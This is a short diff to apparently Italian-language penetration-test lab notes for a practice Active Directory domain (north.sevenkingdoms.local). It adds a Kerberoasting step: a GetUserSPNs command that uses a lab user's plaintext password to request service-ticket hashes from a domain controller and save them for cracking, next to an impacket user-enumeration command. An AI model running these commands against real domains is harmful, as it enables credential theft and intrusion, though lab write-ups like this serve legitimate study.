@@ -60,5 +60,7 @@ impacket-GetADUsers -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
 ![[Pasted image 20230825105044.png]]
 
 ### **KERBEROASTING (SPN)**
-
-Proviamo a vedere se c'è qualche SPN
+Proviamo a vedere se c'è qualche SPN settato e con l'hash in chiaro (Cosa che capita spesso)
+```bash
+GetUserSPNs -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
+```
